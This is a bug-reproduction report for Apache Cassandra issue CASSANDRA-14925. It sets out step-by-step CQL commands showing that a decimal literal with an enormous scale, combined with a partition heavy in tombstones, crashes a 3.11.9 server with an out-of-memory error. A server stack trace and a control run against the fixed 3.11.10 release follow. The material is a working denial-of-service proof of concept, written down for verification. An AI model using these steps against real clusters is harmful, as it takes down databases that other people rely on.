# CASSANDRA-14925 — DecimalSerializer.toString() can be used as an OOM attack

- **Disposition:** REPRODUCED (verbatim server-side OOM stack captured)
- **Buggy image:** `cassandra:3.11.9`  (pod `cass`, ns `repro-14925`, pinned to kind-worker3)
- **Fixed control image:** `cassandra:3.11.10`  (pod `cass-ctl`, same ns/node)
- **Topology:** single node (this is a value-stringification bug — one node is sufficient)
- **Keyspace:** `repro14925`  (RF=1, SimpleStrategy)

## Primary source (Jira body)
`DecimalSerializer.toString(value)` uses `BigDecimal.toPlainString()`, which materialises a
gigantic string for large-scale values:
```java
BigDecimal d = new BigDecimal("1e-" + (Integer.MAX_VALUE - 6));  // 1e-2147483641
d.toPlainString(); // oom
```
Fix adds a guard: use `BigDecimal.toString()` when scale > 100 (configurable via
`-Dcassandra.decimal.maxscaleforstring`). fixVersions: 3.0.24, 3.11.10, 4.0-rc1, 4.0.

## Source confirmation (cloned cassandra-3.11.9)
`src/java/org/apache/cassandra/serializers/DecimalSerializer.java` (buggy, no guard):
```java
public String toString(BigDecimal value)
{
    return value == null ? "" : value.toPlainString();
}
```
`AbstractType.getString(ByteBuffer)` calls `serializer.toString(serializer.deserialize(bytes))`.

## Tag correction (classifier hint was WRONG about the trigger path)
HINT said: "decimal w/ huge negative scale read via SELECT JSON / tracing -> OOM".
- `SELECT JSON` does **NOT** fire it. In 3.11.9 `DecimalType.toJSONString` uses
  `Objects.toString(getSerializer().deserialize(buffer), "\"\"")` = `BigDecimal.toString()`
  (compact, scientific). Empirically returned `{"id": 1, "d": 1E-2147483641}` with no OOM.
- `TRACING ON; SELECT ... WHERE d = <literal> ALLOW FILTERING` on a partition with 0 tombstones
  also did NOT fire it (trace only echoes the raw CQL string, not getString).
- **The real client-reachable path** is the tombstone-warning / tombstone-failure rendering:
  `ReadCommand$MetricRecording.onClose` (or `countTombstone`) -> `ReadCommand.toCQLString()` ->
  `appendCQLWhereClause` -> `RowFilter.toString()` -> `RowFilter$SimpleExpression.toString()` ->
  `column.type.getString(value)` -> `DecimalSerializer.toString()` -> `BigDecimal.toPlainString()` -> OOM.
  This needs the malicious decimal in the WHERE clause AND a tombstone-heavy scan so the
  metric-recording render runs. (tombstone_warn_threshold=1000, tombstone_failure_threshold=100000.)

## Reproduction steps (buggy 3.11.9, pod `cass`)
```
# keyspace + table (decimal as a regular column; clustering ck to make many rows)
CREATE KEYSPACE repro14925 WITH replication={'class':'SimpleStrategy','replication_factor':1};
CREATE TABLE repro14925.t (pk int, ck int, d decimal, PRIMARY KEY (pk, ck));

# one live row carrying the malicious decimal value, then 3000 row tombstones in pk=1
INSERT INTO repro14925.t (pk, ck, d) VALUES (1, 0, 1E-2147483641);
DELETE FROM repro14925.t WHERE pk=1 AND ck=1;   ... (ck=1..3000)
```
Confirmed tombstones present (server emitted, BEFORE the malicious render — note compact form
because d was NOT yet in the WHERE clause here):
```
Warnings :
Read 1 live rows and 3000 tombstone cells for query SELECT * FROM repro14925.t WHERE pk = 1 LIMIT 100; token -4069959284402364209 (see tombstone_warn_threshold)
```

### TRIGGER (buggy)
```
kubectl exec -n repro-14925 cass -- cqlsh --request-timeout=90 \
  -e "SELECT pk,ck FROM repro14925.t WHERE pk=1 AND d = 1E-2147483641 ALLOW FILTERING;"
```
Client-side result:
```
<stdin>:1:ReadFailure: Error from server: code=1300 [Replica(s) failed to execute read] message="Operation failed - received 0 responses and 1 failures" info={'failures': 1, 'received_responses': 0, 'required_responses': 1, 'consistency': 'ONE'}
```
(The client ReadFailure is NOT the signature — the signature is the SERVER stack below.)

### VERBATIM BUGGY SIGNATURE (server log, `kubectl logs -n repro-14925 cass`)
```
ERROR [ReadStage-11] 2026-06-12 04:28:31,246 AbstractLocalAwareExecutorService.java:166 - Uncaught exception on thread Thread[ReadStage-11,10,main]
java.lang.OutOfMemoryError: Java heap space
	at java.lang.AbstractStringBuilder.<init>(AbstractStringBuilder.java:68) ~[na:1.8.0_282]
	at java.lang.StringBuilder.<init>(StringBuilder.java:101) ~[na:1.8.0_282]
	at java.math.BigDecimal.getValueString(BigDecimal.java:3000) ~[na:1.8.0_282]
	at java.math.BigDecimal.toPlainString(BigDecimal.java:2984) ~[na:1.8.0_282]
	at org.apache.cassandra.serializers.DecimalSerializer.toString(DecimalSerializer.java:70) ~[apache-cassandra-3.11.9.jar:3.11.9]
	at org.apache.cassandra.serializers.DecimalSerializer.toString(DecimalSerializer.java:26) ~[apache-cassandra-3.11.9.jar:3.11.9]
	at org.apache.cassandra.db.marshal.AbstractType.getString(AbstractType.java:134) ~[apache-cassandra-3.11.9.jar:3.11.9]
	at org.apache.cassandra.db.filter.RowFilter$SimpleExpression.toString(RowFilter.java:860) ~[apache-cassandra-3.11.9.jar:3.11.9]
	at java.lang.String.valueOf(String.java:2994) ~[na:1.8.0_282]
	at java.lang.StringBuilder.append(StringBuilder.java:131) ~[na:1.8.0_282]
	at org.apache.cassandra.db.filter.RowFilter.toString(RowFilter.java:294) ~[apache-cassandra-3.11.9.jar:3.11.9]
	at java.lang.String.valueOf(String.java:2994) ~[na:1.8.0_282]
	at java.lang.StringBuilder.append(StringBuilder.java:131) ~[na:1.8.0_282]
	at org.apache.cassandra.db.SinglePartitionReadCommand.appendCQLWhereClause(SinglePartitionReadCommand.java:1134) ~[apache-cassandra-3.11.9.jar:3.11.9]
	at org.apache.cassandra.db.ReadCommand.toCQLString(ReadCommand.java:691) ~[apache-cassandra-3.11.9.jar:3.11.9]
	at org.apache.cassandra.db.ReadCommand$1MetricRecording.onClose(ReadCommand.java:574) ~[apache-cassandra-3.11.9.jar:3.11.9]
	at org.apache.cassandra.db.transform.BasePartitions.runOnClose(BasePartitions.java:70) ~[apache-cassandra-3.11.9.jar:3.11.9]
	at org.apache.cassandra.db.transform.BaseIterator.close(BaseIterator.java:86) ~[apache-cassandra-3.11.9.jar:3.11.9]
	at org.apache.cassandra.service.StorageProxy$LocalReadRunnable.runMayThrow(StorageProxy.java:1887) ~[apache-cassandra-3.11.9.jar:3.11.9]
	at org.apache.cassandra.service.StorageProxy$DroppableRunnable.run(StorageProxy.java:2652) ~[apache-cassandra-3.11.9.jar:3.11.9]
	...
ERROR [ReadStage-11] 2026-06-12 04:28:31,246 JVMStabilityInspector.java:94 - OutOfMemory error letting the JVM handle the error:
java.lang.OutOfMemoryError: Java heap space
#
# java.lang.OutOfMemoryError: Java heap space
# -XX:OnOutOfMemoryError="kill -9 %p"
#   Executing /bin/sh -c "kill -9 1"...
```
This is exactly the bug: `DecimalSerializer.toString` -> `BigDecimal.toPlainString` builds a
~2.1-billion-char string -> heap exhausted. `-XX:OnOutOfMemoryError=kill -9` then fires.

## A/B CONTROL (fixed 3.11.10, pod `cass-ctl`) — identical workload
Same keyspace/table, same 1 live row with `d=1E-2147483641` + 3000 row tombstones in pk=1,
same trigger query. `SELECT release_version` = `3.11.10`.

### IDENTICAL TRIGGER on 3.11.10
```
kubectl exec -n repro-14925 cass-ctl -- cqlsh --request-timeout=60 \
  -e "SELECT pk,ck FROM repro14925.t WHERE pk=1 AND d = 1E-2147483641 ALLOW FILTERING;"
```
Result — query SUCCEEDS, returns the live row, NO crash:
```
 pk | ck
----+----
  1 |  0

(1 rows)

Warnings :
Read 1 live rows and 3000 tombstone cells for query SELECT * FROM repro14925.t WHERE pk = 1 AND d = 1E-2147483641 LIMIT 100; token -4069959284402364209 (see tombstone_warn_threshold)
```
The SAME tombstone-warn render path runs (server log `ReadCommand.java:576`), and it renders the
decimal **compactly** — `d = 1E-2147483641` — via the fix's `BigDecimal.toString()` /
`-Dcassandra.decimal.maxscaleforstring=100` guard, instead of `toPlainString()`:
```
WARN  [ReadStage-7] 2026-06-12 04:30:19,443 ReadCommand.java:576 - Read 1 live rows and 3000 tombstone cells for query SELECT * FROM repro14925.t WHERE pk = 1 AND d = 1E-2147483641 LIMIT 100; token -4069959284402364209 (see tombstone_warn_threshold)
```
Control pod restarts: 0. No `OutOfMemoryError` / `toPlainString` / `DecimalSerializer` in the
control server log. The ONLY difference between the two runs is the image version (3.11.9 vs
3.11.10), and the ONLY behavioral difference is the OOM — exactly the code the fix changed.

## Conclusion
REPRODUCED on cassandra:3.11.9. Server-side `DecimalSerializer.toString()` -> `BigDecimal.toPlainString()`
OOM is reachable from an ordinary client CQL query (`WHERE <decimal-col> = <huge-scale-literal>
ALLOW FILTERING` over a tombstone-heavy partition, which triggers the tombstone metric-recording
render of `toCQLString()`). Verbatim stack captured. 3.11.10 A/B control runs the identical workload
with no OOM (compact render). Classifier hint trigger (SELECT JSON / tracing) was inaccurate for
3.11.9 and was corrected to the RowFilter/tombstone-render path.

